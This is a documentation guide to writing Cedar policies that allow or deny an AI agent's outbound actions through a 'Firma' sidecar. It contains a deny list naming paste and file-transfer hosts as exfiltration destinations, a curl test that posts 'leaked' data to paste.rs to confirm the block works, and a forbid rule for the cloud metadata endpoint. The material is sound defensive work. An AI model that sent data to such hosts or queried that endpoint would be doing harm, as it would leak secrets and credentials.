---
title: Write your first Cedar policy
description: Author, validate, and reload a Cedar policy that decides ALLOW or DENY for an agent action.
---

This guide takes you from "I have a running Sidecar" to "I am writing my own runtime policy". You'll start from a copy of the demo bundle, narrow it for a real agent identity, add a forbid rule for a sensitive destination, and observe the decision change in the audit log.

You should already have completed [Run the sidecar standalone](../run-the-sidecar/). This guide assumes the Sidecar is running with a policy directory configured under `[sidecar.policy]` that you can edit.

## What we're building

A small policy bundle for an agent identified as `support-agent`:

- It can `communication.external.send` to known SaaS APIs (`api.openai.com`, `api.slack.com`).
- It must not send to anywhere else, period.
- It cannot `payment.transfer` at all.

This is a realistic shape for a "customer support" agent that drafts replies and posts updates but has no business moving money.

## Step 1: Understand the schema

The Sidecar evaluates bundles streamed from the Authority using the embedded
`FIRMA_SCHEMA` — you do not copy `schema.cedarschema` into the policy directory
for runtime enforcement. Use [`firma policy validate`](../test-policies-offline/)
to catch schema errors before the Authority hot-reloads your edits.

## Step 2: Write the base permit

Create `/tmp/firma-standalone/config/policies/support-agent.cedar`:

```cedar
// support-agent: a customer-support drafting/posting agent.
//
// Mission: read tickets, draft replies, post updates to allow-listed
// SaaS APIs. Must not exfiltrate, must not move money.

// Allow OpenAI calls — the agent drafts replies via chat completions.
permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"communication.external.send",
    resource
) when {
    resource == Firma::Resource::"api.openai.com/v1/chat/completions"
};

// Allow Slack posts — the agent posts ticket updates to a channel.
permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"communication.external.send",
    resource
) when {
    resource == Firma::Resource::"slack.com/api/chat.postMessage"
};
```

Two `permit` rules, each pinned to:

- A specific `principal` — only `support-agent` is granted these privileges.
- A specific `action` — only the action class needed.
- A specific `resource` — exact host+path.

This is least privilege expressed in Cedar. Anything outside these two rules falls through to the default-deny.

## Step 3: Add forbid rules for hard limits

In the same file, append:

```cedar
// Hard rule: this agent never moves money. Forbid wins over any future
// permit, so you can keep this rule even if you broaden permits later.
forbid (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"payment.transfer",
    resource
);

// Hard rule: even for permitted classes, never send to known
// exfiltration destinations. Applies to all agents.
forbid (
    principal,
    action == Firma::Action::"communication.external.send",
    resource
) when {
    resource == Firma::Resource::"paste.rs/" ||
    resource == Firma::Resource::"transfer.sh/"
};
```

The first `forbid` is bound to `support-agent`: the rule is part of the agent's identity. The second is unbound: it covers the whole fleet. Both forbid types are valuable — the first gives you a per-agent "thou shalt not", the second gives you a fleet-wide deny list.

## Step 4: Validate the bundle

With the Authority running, edit `.cedar` files under the Authority's
`policy_dir`. The Authority validates each reload against the embedded schema
and streams the bundle to the Sidecar. Rejected reloads are logged on the
Authority and the previous valid bundle keeps streaming.

Catch errors before save with:

```bash
firma policy validate /tmp/firma-standalone/config/policies/support-agent.cedar
```

## Step 5: Test with a real call

You need a capability for `support-agent` covering one of the permitted action classes. For now, use a quick dev capability — the full operator workflow is in [Issue capability tokens](../issue-capability-tokens/).

```bash
firma authority generate-key -o /tmp/firma-standalone/firma-authority.key

# Add an [authority] section to the shared firma.toml
cat >> /tmp/firma-standalone/config/firma.toml <<EOF

[authority]
listen_addr         = "[::1]:50051"
policy_dir          = "/tmp/firma-standalone/config/policies"
issuance_policy_dir = "/tmp/firma-standalone/issuance"
revocation_file     = "/tmp/firma-standalone/revocations.txt"
key_file            = "/tmp/firma-standalone/firma-authority.key"
max_ttl_seconds     = 3600
bundle_ttl_seconds  = 30
EOF

# Permissive issuance policy for development
mkdir -p /tmp/firma-standalone/issuance
cat > /tmp/firma-standalone/issuance/issuance.cedar <<'EOF'
permit (principal, action, resource);
EOF

# Mint a capability for support-agent
firma authority -c /tmp/firma-standalone/config/firma.toml issue \
  --agent-id agt_01j0000000e008000000000001 \
  --session-id session-001 \
  --action communication.external.send \
  --resource-scope '*' \
  --output /tmp/firma-standalone/capability-support.toml
```

Add `[sidecar.authority]` and `[sidecar.capability_seed]` sections to `firma.toml`:

```toml
[sidecar.authority]
url             = "http://[::1]:50051"
public_key_path = "/tmp/firma-standalone/firma-authority.pub"

[sidecar.capability_seed]
paths = ["/tmp/firma-standalone/capability-support.toml"]
```

Restart the Sidecar. Now make a forbidden call:

```bash
curl --proxy http://127.0.0.1:8080 -X POST http://paste.rs/ -d 'leaked'
```

You should see a 403. The audit log will show:

```json
{
  "action": "communication.external.send",
  "resource": "paste.rs/",
  "decision": 2,
  "deny_reason": "policy denied: policy denied action 'communication.external.send' on resource 'paste.rs/'"
}
```

The `deny_reason` closes the loop: you wrote a rule, you produced a request that should be denied, and the audit log proves it was.

## Iteration: hot-reload

For development, the Authority watches the `policy_dir` and pushes updated bundles to the Sidecar. Edit your `.cedar` file and save it; connected Sidecars atomically swap in the streamed update.

The Authority re-validates the bundle against the schema on every reload, exactly as it does at startup. If your edit fails to parse or fails schema validation, the reload is rejected and logged, and the Authority keeps streaming the previously-loaded valid bundle — a broken edit never reaches the Sidecar. Watch the Authority's stderr for the rejection, fix the file, and save again. To catch the error before you save, run `firma policy validate` on the file (see [Test policies offline](../test-policies-offline/)).

In production this stream is what keeps the bundle fresh. In development it gives you a tight write-test loop without restarting the Sidecar.

## Patterns to internalize

A few patterns you'll write over and over:

**Default-deny + scoped permits.** Cedar's default is deny; never write a "permit everything" rule. Add narrow permits for what each agent needs.

**Forbid for hard limits.** Anything that should never happen, regardless of what permits exist now or in the future, deserves a `forbid` rule. Forbids override permits; they survive policy refactoring.

**Resource UIDs are exact strings.** `paste.rs/` and `paste.rs` are different UIDs. The normalizer always produces `host + path`, with `/` for empty paths. If you're not sure, log the resource from a denied call and copy it into your rule.

**Match on `resource.host` / `resource.path` for host-level rules.** The resource entity also carries optional `host` and `path` attributes, so you can write host rules without pinning the full UID. Guard access with `resource has host` (the attributes are optional — a non-HTTP resource may have neither):

```cedar
// Block the cloud metadata endpoint for every agent and action —
// SSRF / IAM-token-theft defense-in-depth.
forbid (
    principal,
    action,
    resource
) when {
    resource has host && resource.host == "169.254.169.254"
};
```

The `resource has host` guard is not optional hygiene: an unguarded `resource.host == …` in a **forbid** on a resource that has no `host` attribute makes Cedar error the condition and *skip the forbid* — the deny silently fails open. Always guard, and keep OS/network-layer blocks (iptables, `bwrap --unshare-net`) as the primary control; the Cedar host rule is a second layer. This is the same forbid shipped in the `firma config` posture templates.

**Use context for graduated controls.** `risk_score`, `action_count`, and `session_duration_s` are all in the runtime context. Gate permits with `when { context.field … }` for "permitted up to a point" rules.

**Use Git context for repo and branch scope.** GitHub HTTPS git traffic is classified by the smart-HTTP rules on `github.com`. A `git push` hits `POST /{owner}/{repo}/git-receive-pack` or `POST /{owner}/{repo}.git/git-receive-pack`, which maps to `code.write`; a delete push is promoted to `code.destructive`. These rules require HTTPS MITM for `github.com` because CONNECT-only mode only sees the tunnel.

```cedar
permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"code.write",
    resource
) when {
    context.git_provider == "github" &&
    context.git_owner == "firma-ai" &&
    context.git_repo == "openfirma" &&
    context.git_ref == "refs/heads/fir-413" &&
    context.git_operation == "write"
};
```

**Action sets for category controls.** `action in [Firma::Action::"filesystem.write", Firma::Action::"filesystem.delete"]` is more readable and harder to drift than two separate rules.

## What's next

- [Issue capability tokens](../issue-capability-tokens/) — full Authority workflow.
- [Inject credentials](../inject-credentials/) — what happens to allowed calls before they leave.
- [Read & verify the audit log](../audit-log/) — verify the signature on every decision.
- [Concepts: Policies](../../concepts/policies/) — for the deeper "why" behind these patterns.
